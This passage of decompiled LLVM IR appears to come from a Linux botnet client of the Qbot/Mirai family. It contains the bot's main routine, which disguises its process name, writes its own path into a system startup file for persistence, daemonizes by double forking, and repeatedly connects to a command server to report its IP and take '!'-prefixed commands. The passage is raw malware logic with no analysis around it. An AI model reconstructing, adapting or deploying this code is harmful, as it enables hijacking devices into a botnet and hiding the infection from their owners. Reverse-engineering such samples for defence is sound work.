  %v2_e464 = load i8, i8* %v5_e45c, align 1
  %v7_e468 = icmp eq i8 %v2_e464, 9
  br i1 %v7_e468, label %dec_label_pc_e470, label %dec_label_pc_e454

dec_label_pc_e470:                                ; preds = %dec_label_pc_e454, %dec_label_pc_e460.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e460.preheader ], [ %v5_e45c, %dec_label_pc_e454 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e4c4

dec_label_pc_e480:                                ; preds = %dec_label_pc_e41c
  store i32 4096, i32* @r2, align 4
  %v3_e498 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e49c

dec_label_pc_e49c:                                ; preds = %dec_label_pc_e3f8, %dec_label_pc_e480
  %v4_e4b4 = call i32 @fdgets(i32 %v2_e4a4, i32 4096, i32 %v4_e40c, i32 %v2_e4a4)
  %v2_e4bc = icmp eq i32 %v4_e4b4, 0
  br i1 %v2_e4bc, label %dec_label_pc_e4c4, label %dec_label_pc_e41c

dec_label_pc_e4c4:                                ; preds = %dec_label_pc_e49c, %dec_label_pc_e470
  %v1_e4c8 = call i32 @__libc_close(i32 %v4_e40c)
  %v4_e4d8 = load i8, i8* %stack_var_-4168, align 1
  %v2_e4dc = icmp eq i8 %v4_e4d8, 0
  br i1 %v2_e4dc, label %dec_label_pc_e574, label %dec_label_pc_e4e4

dec_label_pc_e4e4:                                ; preds = %dec_label_pc_e4c4
  %v2_e4ec = ptrtoint i32* %stack_var_-4200 to i32
  %v3_e504 = call i32 @strcpy(i32 %v2_e4ec, i8* nonnull %stack_var_-4168)
  %v3_e524 = call i32 @ioctl(i32 %v0_e2f0, i32 35111, i32 %v2_e4ec)
  %v2_e544 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e534

dec_label_pc_e534:                                ; preds = %dec_label_pc_e4e4, %dec_label_pc_e534
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e4e4 ], [ %v1_e560, %dec_label_pc_e534 ]
  %v2_e54c = add i32 %storemerge47, %v2_e544
  %v1_e550 = inttoptr i32 %v2_e54c to i8*
  %v2_e550 = load i8, i8* %v1_e550, align 1
  %v4_e558 = add i32 %storemerge47, ptrtoint (i32* @global_var_24180.537 to i32)
  %v5_e558 = inttoptr i32 %v4_e558 to i8*
  store i8 %v2_e550, i8* %v5_e558, align 1
  %v1_e560 = add nuw nsw i32 %storemerge47, 1
  %v7_e570 = icmp slt i32 %v1_e560, 6
  br i1 %v7_e570, label %dec_label_pc_e534, label %dec_label_pc_e574

dec_label_pc_e574:                                ; preds = %dec_label_pc_e534, %dec_label_pc_e4c4
  %v1_e578 = call i32 @__libc_close(i32 %v0_e2f0)
  %v3_e594.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e590

dec_label_pc_e580:                                ; preds = %dec_label_pc_e3e8, %dec_label_pc_e3a8, %dec_label_pc_e308
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e590

dec_label_pc_e590:                                ; preds = %dec_label_pc_e574, %dec_label_pc_e580
  %v3_e594 = phi i32 [ %v3_e594.pre, %dec_label_pc_e574 ], [ 0, %dec_label_pc_e580 ]
  %v2_e59c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e59c, i32* @fp, align 4
  ret i32 %v3_e594

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_e458, { 1, 0 }
  uselistorder i32 %v2_e4a4, { 1, 4, 0, 3, 2 }
  uselistorder i32 %v0_e2f0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 3, 10, 9, 8, 7, 6, 5, 11, 4, 2, 1, 0 }
  uselistorder label %dec_label_pc_e590, { 1, 0 }
  uselistorder label %dec_label_pc_e534, { 1, 0 }
  uselistorder label %dec_label_pc_e49c, { 1, 0 }
  uselistorder label %dec_label_pc_e454, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([10 x i8]* @global_var_19928.539 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e5d4 = load i32, i32* @r4, align 4
  store i32 %v3_e5d4, i32* %stack_var_-24, align 4
  store i32 58844, i32* %stack_var_-4, align 4
  %v19_e5d4 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e5d8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e5d8, i32* @fp, align 4
  %v1_e61c = bitcast i8** %argv to i32*
  %v2_e61c = load i32, i32* %v1_e61c, align 4
  store i32 %v2_e61c, i32* @r4, align 4
  %v2_e634 = load i32, i32* %v1_e61c, align 4
  %v1_e638 = inttoptr i32 %v2_e634 to i8*
  %v3_e63c = call i32 @strlen(i8* %v1_e638)
  %v0_e644 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_19934.541 to i32), i32* @r1, align 4
  %v3_e650 = call i32 @strncpy(i32 %v0_e644, i32 ptrtoint (i32* @global_var_19934.541 to i32), i32 %v3_e63c)
  store i32 ptrtoint (i32* @global_var_19934.541 to i32), i32* %v1_e61c, align 4
  %v0_e68c = call i32 @prctl()
  %v2_e694 = call i32 @__GI_time(i32* null)
  store i32 %v2_e694, i32* @r4, align 4
  %v0_e69c = call i32 @__libc_getpid()
  %v0_e6a4 = load i32, i32* @r4, align 4
  %v2_e6a4 = xor i32 %v0_e6a4, %v0_e69c
  %v1_e6ac = call i32 @srand(i32 %v2_e6a4)
  %v2_e6b4 = call i32 @__GI_time(i32* null)
  store i32 %v2_e6b4, i32* @r4, align 4
  %v0_e6bc = call i32 @__libc_getpid()
  %v0_e6c4 = load i32, i32* @r4, align 4
  %v2_e6c4 = xor i32 %v0_e6c4, %v0_e6bc
  %v1_e6cc = call i32 @init_rand(i32 %v2_e6c4)
  store i32 ptrtoint ([19 x i8]* @global_var_19938.543 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1994c.545 to i32), i32* @r1, align 4
  %v3_e6e8 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_19938.543 to i32), i32 ptrtoint ([2 x i8]* @global_var_1994c.545 to i32))
  %v2_e6f8 = icmp eq i32 %v3_e6e8, 0
  br i1 %v2_e6f8, label %dec_label_pc_e700, label %dec_label_pc_e71c

dec_label_pc_e700:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_19950.547 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1994c.545 to i32), i32* @r1, align 4
  %v3_e710 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_19950.547 to i32), i32 ptrtoint ([2 x i8]* @global_var_1994c.545 to i32))
  br label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %entry, %dec_label_pc_e700
  %stack_var_-88.0 = phi i32 [ %v3_e710, %dec_label_pc_e700 ], [ %v3_e6e8, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_19950.547, i32 0, i32 0), %dec_label_pc_e700 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_19938.543, i32 0, i32 0), %entry ]
  %v2_e720 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e720, label %dec_label_pc_e8b8, label %dec_label_pc_e728

dec_label_pc_e728:                                ; preds = %dec_label_pc_e71c
  %v2_e738 = load i32, i32* %v1_e61c, align 4
  %v1_e73c = inttoptr i32 %v2_e738 to i8*
  %v3_e740 = call i32 @strlen(i8* %v1_e73c)
  %v2_e754 = ptrtoint i32* %stack_var_-368 to i32
  %v2_e760 = call i32 @getcwd(i32 %v2_e754, i32 256)
  store i32 ptrtoint (i32* @global_var_19960.549 to i32), i32* @r1, align 4
  %v2_e770 = bitcast i32* %stack_var_-368 to i8*
  %v3_e770 = call i32 @__GI_strcoll(i8* %v2_e770, i32 ptrtoint (i32* @global_var_19960.549 to i32))
  %v2_e778 = icmp eq i32 %v3_e770, 0
  br i1 %v2_e778, label %dec_label_pc_e8b0, label %dec_label_pc_e790

dec_label_pc_e784:                                ; preds = %dec_label_pc_e790
  %v1_e788 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e790

dec_label_pc_e790:                                ; preds = %dec_label_pc_e728, %dec_label_pc_e784
  %stack_var_-84.0 = phi i32 [ %v1_e788, %dec_label_pc_e784 ], [ %v3_e740, %dec_label_pc_e728 ]
  %v2_e7a0 = load i32, i32* %v1_e61c, align 4
  %v2_e7a8 = add i32 %v2_e7a0, %stack_var_-84.0
  %v1_e7ac = inttoptr i32 %v2_e7a8 to i8*
  %v2_e7ac = load i8, i8* %v1_e7ac, align 1
  %v7_e7b0 = icmp eq i8 %v2_e7ac, 47
  br i1 %v7_e7b0, label %dec_label_pc_e7b8, label %dec_label_pc_e784

dec_label_pc_e7b8:                                ; preds = %dec_label_pc_e790
  %v2_e7c8 = load i32, i32* %v1_e61c, align 4
  %v2_e7d0 = add i32 %v2_e7c8, %stack_var_-84.0
  %v2_e7d4 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e7d4, i32* @r0, align 4
  %v7_e7e8 = call i32 @sprintf(i32 %v2_e7d4, i32 ptrtoint ([8 x i8]* @global_var_19964.551 to i32), i32 %v2_e754, i32 %v2_e7d0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e844 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e7f8 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e824 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e840.outer

dec_label_pc_e7f0:                                ; preds = %dec_label_pc_e840
  %v3_e808 = call i32 @fgets(i32 %v2_e7f8, i32 1024, i32 %stack_var_-88.0)
  %v3_e824 = call i32 @__GI_strcasecmp(i8* %v2_e824, i32 %v2_e7d4)
  %v2_e82c = icmp eq i32 %v3_e824, 0
  br i1 %v2_e82c, label %dec_label_pc_e834, label %dec_label_pc_e840

dec_label_pc_e834:                                ; preds = %dec_label_pc_e7f0
  %v1_e838 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e840.outer

dec_label_pc_e840.outer:                          ; preds = %dec_label_pc_e834, %dec_label_pc_e7b8
  %stack_var_-80.0.ph = phi i32 [ %v1_e838, %dec_label_pc_e834 ], [ 0, %dec_label_pc_e7b8 ]
  br label %dec_label_pc_e840

dec_label_pc_e840:                                ; preds = %dec_label_pc_e840.outer, %dec_label_pc_e7f0
  %v2_e844 = call i32 @feof(i8* %v1_e844)
  %v2_e84c = icmp eq i32 %v2_e844, 0
  br i1 %v2_e84c, label %dec_label_pc_e7f0, label %dec_label_pc_e854

dec_label_pc_e854:                                ; preds = %dec_label_pc_e840
  %v2_e858 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_e864 = call i32 @__GI_fclose(i8* %v1_e844)
  br i1 %v2_e858, label %dec_label_pc_e860, label %dec_label_pc_e8b8

dec_label_pc_e860:                                ; preds = %dec_label_pc_e854
  %v4_e868 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_e868, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1996c.553 to i32), i32* @r1, align 4
  %v3_e870 = call i32 @__GI_fopen(i32 %v4_e868, i32 ptrtoint (i32* @global_var_1996c.553 to i32))
  %v2_e880 = icmp eq i32 %v3_e870, 0
  br i1 %v2_e880, label %dec_label_pc_e8b8, label %dec_label_pc_e888

dec_label_pc_e888:                                ; preds = %dec_label_pc_e860
  %v2_e894 = call i32 @__GI_fputs(i32 %v2_e7d4, i32 %v3_e870)
  %v1_e89c = inttoptr i32 %v3_e870 to i8*
  %v2_e89c = call i32 @__GI_fclose(i8* %v1_e89c)
  br label %dec_label_pc_e8b8

dec_label_pc_e8b0:                                ; preds = %dec_label_pc_e728
  %v1_e8b4 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_e8b4 = call i32 @__GI_fclose(i8* %v1_e8b4)
  br label %dec_label_pc_e8b8

dec_label_pc_e8b8:                                ; preds = %dec_label_pc_e854, %dec_label_pc_e860, %dec_label_pc_e71c, %dec_label_pc_e888, %dec_label_pc_e8b0
  %v0_e8b8 = call i32 @getOurIP()
  %v0_e8bc = call i32 @__libc_fork()
  %v2_e8cc = icmp eq i32 %v0_e8bc, 0
  br i1 %v2_e8cc, label %dec_label_pc_e8fc, label %dec_label_pc_e938

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e8b8
  %v0_e8fc = call i32 @__libc_fork()
  %v2_e90c = icmp eq i32 %v0_e8fc, 0
  br i1 %v2_e90c, label %dec_label_pc_e91c.thread, label %dec_label_pc_e928

dec_label_pc_e91c.thread:                         ; preds = %dec_label_pc_e8fc
  br label %dec_label_pc_e944

dec_label_pc_e928:                                ; preds = %dec_label_pc_e8fc
  %v1_e918 = call i32 @__GI_exit(i32 0)
  %v2_e930 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_19970.555 to i32))
  br label %dec_label_pc_e944

dec_label_pc_e938:                                ; preds = %dec_label_pc_e8b8
  %v2_e8d4 = ptrtoint i32* %stack_var_-112 to i32
  %v3_e8e4 = call i32 @__libc_waitpid(i32 %v0_e8bc, i32 %v2_e8d4, i32 0)
  %v1_e8ec = call i32 @__GI_exit(i32 0)
  %v2_e940 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_19970.555 to i32))
  br label %dec_label_pc_e944

dec_label_pc_e944:                                ; preds = %dec_label_pc_e91c.thread, %dec_label_pc_e928, %dec_label_pc_e938
  %v0_e944 = call i32 @__GI_setsid()
  %v0_e94c = call i32 @chdir()
  %v2_e958 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_f1fc = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f20c = bitcast i32* %stack_var_-5744 to i8*
  %v2_eca4 = add i32 %v19_e5d4, -5720
  %v2_ef64 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_ef74 = bitcast i32* %stack_var_-1648 to i8*
  %v1_ede8 = or i32 %v2_f1fc, 1
  %v5_edec = inttoptr i32 %v1_ede8 to i8*
  %v2_ee08 = or i32 %v2_f1fc, 2
  %v2_f0c8 = add i32 %v19_e5d4, -600
  br label %dec_label_pc_e960.outer

dec_label_pc_e960.outer:                          ; preds = %dec_label_pc_ed40, %dec_label_pc_f1ec, %dec_label_pc_e944
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_e944 ], [ %stack_var_-96.2.ph, %dec_label_pc_f1ec ], [ %v1_ed44, %dec_label_pc_ed40 ]
  %v0_e96024 = call i32 @initConnection()
  %v2_e96826 = icmp eq i32 %v0_e96024, 0
  br i1 %v2_e96826, label %dec_label_pc_e97c, label %dec_label_pc_e970

dec_label_pc_e970:                                ; preds = %dec_label_pc_e960.outer, %dec_label_pc_e970
  %v1_e974 = call i32 @sleep(i32 30)
  %v0_e960 = call i32 @initConnection()
  %v2_e968 = icmp eq i32 %v0_e960, 0
  br i1 %v2_e968, label %dec_label_pc_e97c, label %dec_label_pc_e970

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e970, %dec_label_pc_e960.outer
  %v2_e980 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_e980, i32* @r5, align 4
  %v2_e988 = load i32, i32* @global_var_2a3f0.80, align 4
  store i32 %v2_e988, i32* @r0, align 4
  %v1_e98c = call i32 @__GI_inet_ntoa(i32 %v2_e988)
  store i32 %v1_e98c, i32* @r4, align 4
  %v0_e994 = call i32 @getBuild()
  %v0_e99c = load i32, i32* @r5, align 4
  %v0_e9a4 = load i32, i32* @r4, align 4
  store i32 %v0_e9a4, i32* @r2, align 4
  %v2_e9a8 = call i32 @Rootsprintf(i32 %v0_e99c, i32 ptrtoint (i32* @global_var_19980.559 to i32))
  br label %dec_label_pc_f1ec.outer

dec_label_pc_e9cc:                                ; preds = %dec_label_pc_ec7c, %dec_label_pc_ec28
  %v3_e9d0 = mul i32 %v3_ec70, 4
  %v2_e9dc = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_e9e0 = add i32 %v2_e9dc, %v3_e9d0
  %v1_e9e4 = inttoptr i32 %v2_e9e0 to i32*
  %v2_e9e4 = load i32, i32* %v1_e9e4, align 4
  %v3_e9f4 = call i32 @__libc_waitpid(i32 %v2_e9e4, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_e9f4, 1
  br i1 %tmp111, label %dec_label_pc_ec1c, label %dec_label_pc_ea5c

dec_label_pc_ea14:                                ; preds = %dec_label_pc_eab8, %dec_label_pc_ea5c
  %v3_ea18 = mul i32 %v1_ea08, 4
  %v2_ea24 = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_ea28 = add i32 %v2_ea24, %v3_ea18
  %v1_ea2c = add i32 %v2_ea28, -4
  %v1_ea48 = inttoptr i32 %v2_ea28 to i32*
  %v2_ea48 = load i32, i32* %v1_ea48, align 4
  %v2_ea4c = inttoptr i32 %v1_ea2c to i32*
  store i32 %v2_ea48, i32* %v2_ea4c, align 4
  br label %dec_label_pc_ea5c

dec_label_pc_ea5c:                                ; preds = %dec_label_pc_e9cc, %dec_label_pc_ea14
  %v3_ea04.sink = phi i32 [ %v1_ea08, %dec_label_pc_ea14 ], [ %v3_ec70, %dec_label_pc_e9cc ]
  %v1_ea08 = add i32 %v3_ea04.sink, 1
  %v2_ea78 = load i32, i32* @global_var_24178.66, align 4
  %v5_ea78 = load i32, i32* @global_var_2417c.67, align 4
  %tmp112 = icmp ugt i32 %v5_ea78, %v1_ea08
  br i1 %tmp112, label %dec_label_pc_ea14, label %dec_label_pc_eaa0

dec_label_pc_eaa0:                                ; preds = %dec_label_pc_ea5c
  %v9_eab0 = icmp eq i32 %v5_ea78, %v1_ea08
  br i1 %v9_eab0, label %dec_label_pc_eab8, label %dec_label_pc_ead0

dec_label_pc_eab8:                                ; preds = %dec_label_pc_eaa0
  %v9_eac8 = icmp eq i32 %v2_ea78, 0
  br i1 %v9_eac8, label %dec_label_pc_ead0, label %dec_label_pc_ea14

dec_label_pc_ead0:                                ; preds = %dec_label_pc_eab8, %dec_label_pc_eaa0
  %v3_ead4 = mul i32 %v1_ea08, 4
  %v2_eae0 = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_eae4 = add i32 %v3_ead4, -4
  %v1_eae8 = add i32 %v2_eae4, %v2_eae0
  %v2_eaf0 = inttoptr i32 %v1_eae8 to i32*
  store i32 0, i32* %v2_eaf0, align 4
  %v2_eaf8 = load i32, i32* @global_var_24178.66, align 4
  %v5_eaf8 = load i32, i32* @global_var_2417c.67, align 4
  %v2_eb04 = add i32 %v2_eaf8, -1
  %v3_eb04 = icmp ne i32 %v2_eaf8, 0
  %v3_eb08 = add i32 %v5_eaf8, -1
  %v4_eb08 = zext i1 %v3_eb04 to i32
  %v5_eb08 = add i32 %v3_eb08, %v4_eb08
  store i32 %v2_eb04, i32* @global_var_24178.66, align 4
  store i32 %v5_eb08, i32* @global_var_2417c.67, align 4
  %v3_eb1c = udiv i32 %v2_eb04, 1073741824
  %v3_eb20 = mul i32 %v5_eb08, 4
  %v2_eb24 = or i32 %v3_eb20, %v3_eb1c
  store i32 %v2_eb24, i32* @r4, align 4
  %v3_eb28 = mul i32 %v2_eb04, 4
  %v1_eb2c = add i32 %v3_eb28, 4
  %v1_eb34 = call i32 @malloc(i32 %v1_eb2c)
  br label %dec_label_pc_eb8c

dec_label_pc_eb4c:                                ; preds = %dec_label_pc_ebe8, %dec_label_pc_eb8c
  %v3_eb50 = mul i32 %v3_ebdc, 4
  %v2_eb5c = add i32 %v3_eb50, %v1_eb34
  %v2_eb70 = load i32, i32* @global_var_2a3fc.69, align 4
  %v2_eb74 = add i32 %v2_eb70, %v3_eb50
  %v1_eb78 = inttoptr i32 %v2_eb74 to i32*
  %v2_eb78 = load i32, i32* %v1_eb78, align 4
  %v2_eb7c = inttoptr i32 %v2_eb5c to i32*
  store i32 %v2_eb78, i32* %v2_eb7c, align 4
  %v1_eb84 = add i32 %v3_ebdc, 1
  br label %dec_label_pc_eb8c

dec_label_pc_eb8c:                                ; preds = %dec_label_pc_ead0, %dec_label_pc_eb4c
  %v3_ebdc = phi i32 [ 0, %dec_label_pc_ead0 ], [ %v1_eb84, %dec_label_pc_eb4c ]
  %v2_eba8 = load i32, i32* @global_var_24178.66, align 4
  %v5_eba8 = load i32, i32* @global_var_2417c.67, align 4
  %tmp113 = icmp ugt i32 %v5_eba8, %v3_ebdc
  br i1 %tmp113, label %dec_label_pc_eb4c, label %dec_label_pc_ebd0

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eb8c
  %v9_ebe0 = icmp eq i32 %v5_eba8, %v3_ebdc
  br i1 %v9_ebe0, label %dec_label_pc_ebe8, label %dec_label_pc_ec00

dec_label_pc_ebe8:                                ; preds = %dec_label_pc_ebd0
  %v9_ebf8 = icmp eq i32 %v2_eba8, 0
  br i1 %v9_ebf8, label %dec_label_pc_ec00, label %dec_label_pc_eb4c

dec_label_pc_ec00:                                ; preds = %dec_label_pc_ebe8, %dec_label_pc_ebd0
  %v2_ec04 = load i32, i32* @global_var_2a3fc.69, align 4
  store i32 %v2_ec04, i32* @r0, align 4
  %v0_ec0c = call i32 @free()
  store i32 %v1_eb34, i32* @global_var_2a3fc.69, align 4
  br label %dec_label_pc_ec1c

dec_label_pc_ec1c:                                ; preds = %dec_label_pc_e9cc, %dec_label_pc_ec00
  %v1_ec20 = add i32 %v3_ec70, 1
  br label %dec_label_pc_ec28

dec_label_pc_ec28:                                ; preds = %dec_label_pc_f1ec, %dec_label_pc_ec1c
  %v3_ec70 = phi i32 [ %v1_ec20, %dec_label_pc_ec1c ], [ 0, %dec_label_pc_f1ec ]
  %v3_ec30 = ashr i32 %v3_ec70, 31
  %v2_ec40 = load i32, i32* @global_var_24178.66, align 4
  %v5_ec40 = load i32, i32* @global_var_2417c.67, align 4
  %v3_ec5c = icmp uge i32 %v5_ec40, %v3_ec70
  %v9_ec5c = icmp eq i32 %v5_ec40, %v3_ec70
  %v2_ec60 = xor i1 %v9_ec5c, true
  %v3_ec60 = and i1 %v3_ec5c, %v2_ec60
  br i1 %v3_ec60, label %dec_label_pc_e9cc, label %dec_label_pc_ec64

dec_label_pc_ec64:                                ; preds = %dec_label_pc_ec28
  br i1 %v9_ec5c, label %dec_label_pc_ec7c, label %dec_label_pc_ec94

dec_label_pc_ec7c:                                ; preds = %dec_label_pc_ec64
  %tmp = icmp ugt i32 %v2_ec40, %v3_ec30
  br i1 %tmp, label %dec_label_pc_e9cc, label %dec_label_pc_ec94

dec_label_pc_ec94:                                ; preds = %dec_label_pc_ec64, %dec_label_pc_ec7c
  %v2_eca8 = add i32 %v2_eca4, %v5_f20c
  %v3_eca8 = inttoptr i32 %v2_eca8 to i8*
  store i8 0, i8* %v3_eca8, align 1
  %v2_ecc4 = call i32 @trim(i8* %v4_f20c)
  %v9_ecdc = call i32 @strstr(i32 %v2_f1fc, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_193d8.50, i32 0, i32 0), i32 %v2_eca8, i32 %v2_f1fc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v9_ecdc, i32* @r2, align 4
  %v9_ecf0 = icmp eq i32 %v9_ecdc, %v2_f1fc
  br i1 %v9_ecf0, label %dec_label_pc_ecf8, label %dec_label_pc_ed10

dec_label_pc_ecf8:                                ; preds = %dec_label_pc_ec94
  %v2_ecfc = load i32, i32* @global_var_24170.48, align 4
  %v3_ed08 = call i32 @Rootsprintf(i32 %v2_ecfc, i32 ptrtoint ([5 x i8]* @global_var_199e8.564 to i32))
  br label %dec_label_pc_f1ec

dec_label_pc_ed10:                                ; preds = %dec_label_pc_ec94
  %v8_ed24 = call i32 @strstr(i32 %v2_f1fc, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_199f0.566, i32 0, i32 0), i32 %v9_ecdc, i32 %v2_f1fc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v9_ed38 = icmp eq i32 %v8_ed24, %v2_f1fc
  br i1 %v9_ed38, label %dec_label_pc_ed40, label %dec_label_pc_ed6c

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed10
  %v1_ed44 = add i32 %stack_var_-96.2.ph, 1
  %v2_ed54 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_199fc.568 to i32))
  %v7_ed60 = icmp slt i32 %v1_ed44, 21
  br i1 %v7_ed60, label %dec_label_pc_e960.outer, label %dec_label_pc_ed64

dec_label_pc_ed64:                                ; preds = %dec_label_pc_ed40
  %v1_ed68 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_ed6c

dec_label_pc_ed6c:                                ; preds = %dec_label_pc_ed10, %dec_label_pc_ed64
  %stack_var_-96.1 = phi i32 [ %v1_ed44, %dec_label_pc_ed64 ], [ %stack_var_-96.2.ph, %dec_label_pc_ed10 ]
  %v2_ed80 = load i8, i8* %v4_f20c, align 4
  %v7_ed84 = icmp eq i8 %v2_ed80, 33
  br i1 %v7_ed84, label %dec_label_pc_eda8, label %dec_label_pc_f1ec.outer

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed6c, %dec_label_pc_edb8
  %v3_ed8c.sink = phi i8* [ %storemerge8, %dec_label_pc_edb8 ], [ %v4_f20c, %dec_label_pc_ed6c ]
  %v4_ed8c = ptrtoint i8* %v3_ed8c.sink to i32
  %v1_ed90 = add i32 %v4_ed8c, 1
  %storemerge8 = inttoptr i32 %v1_ed90 to i8*
  %v2_edac = load i8, i8* %storemerge8, align 1
  %v7_edb0 = icmp eq i8 %v2_edac, 32
  br i1 %v7_edb0, label %dec_label_pc_edc8, label %dec_label_pc_edb8

dec_label_pc_edb8:                                ; preds = %dec_label_pc_eda8
  %v2_edbc = load i8, i8* %storemerge8, align 1
  %v2_edc0 = icmp eq i8 %v2_edbc, 0
  br i1 %v2_edc0, label %dec_label_pc_edc8, label %dec_label_pc_eda8

dec_label_pc_edc8:                                ; preds = %dec_label_pc_edb8, %dec_label_pc_eda8
  %v2_edcc = load i8, i8* %storemerge8, align 1
  %v2_edd0 = icmp eq i8 %v2_edcc, 0
  br i1 %v2_edd0, label %dec_label_pc_f1ec.outer, label %dec_label_pc_edd8

dec_label_pc_edd8:                                ; preds = %dec_label_pc_edc8
  store i8 0, i8* %storemerge8, align 1
  %v3_edf8 = call i32 @strlen(i8* %v5_edec)
  %v1_ee0c = add i32 %v3_edf8, %v2_ee08
  %v5_ee10 = inttoptr i32 %v1_ee0c to i8*
  %v2_ee58 = add i32 %v1_ee0c, -1
  br label %dec_label_pc_ee40

dec_label_pc_ee18:                                ; preds = %dec_label_pc_ee6c, %dec_label_pc_ee40
  %v3_ee20 = call i32 @strlen(i8* %v5_ee10)
  %v1_ee34 = add i32 %v2_ee58, %v3_ee20
  %v3_ee3c = inttoptr i32 %v1_ee34 to i8*
  store i8 0, i8* %v3_ee3c, align 1
  br label %dec_label_pc_ee40

dec_label_pc_ee40:                                ; preds = %dec_label_pc_edd8, %dec_label_pc_ee18
  %v3_ee48 = call i32 @strlen(i8* %v5_ee10)
  %v1_ee5c = add i32 %v3_ee48, %v2_ee58
  %v1_ee60 = inttoptr i32 %v1_ee5c to i8*
  %v2_ee60 = load i8, i8* %v1_ee60, align 1
  %v7_ee64 = icmp eq i8 %v2_ee60, 10
  br i1 %v7_ee64, label %dec_label_pc_ee18, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %dec_label_pc_ee40
  %v3_ee74 = call i32 @strlen(i8* %v5_ee10)
  %v1_ee88 = add i32 %v3_ee74, %v2_ee58
  %v1_ee8c = inttoptr i32 %v1_ee88 to i8*
  %v2_ee8c = load i8, i8* %v1_ee8c, align 1
  %v7_ee90 = icmp eq i8 %v2_ee8c, 13
  br i1 %v7_ee90, label %dec_label_pc_ee18, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %dec_label_pc_ee6c
  %v2_eeb428 = load i8, i8* %v5_ee10, align 1
  %v7_eeb832 = icmp eq i8 %v2_eeb428, 32
  br i1 %v7_eeb832, label %dec_label_pc_eed0, label %dec_label_pc_eec0

dec_label_pc_eea4:                                ; preds = %dec_label_pc_eec0
  %v1_eea8 = add i32 %v4_eeb034, 1
  %v5_eeac = inttoptr i32 %v1_eea8 to i8*
  %v2_eeb4 = load i8, i8* %v5_eeac, align 1
  %v7_eeb8 = icmp eq i8 %v2_eeb4, 32
  br i1 %v7_eeb8, label %dec_label_pc_eed0, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %dec_label_pc_ee98, %dec_label_pc_eea4
  %v4_eeb034 = phi i32 [ %v1_eea8, %dec_label_pc_eea4 ], [ %v1_ee0c, %dec_label_pc_ee98 ]
  %stack_var_-64.033 = phi i8* [ %v5_eeac, %dec_label_pc_eea4 ], [ %v5_ee10, %dec_label_pc_ee98 ]
  %v2_eec4 = load i8, i8* %stack_var_-64.033, align 1
  %v2_eec8 = icmp eq i8 %v2_eec4, 0
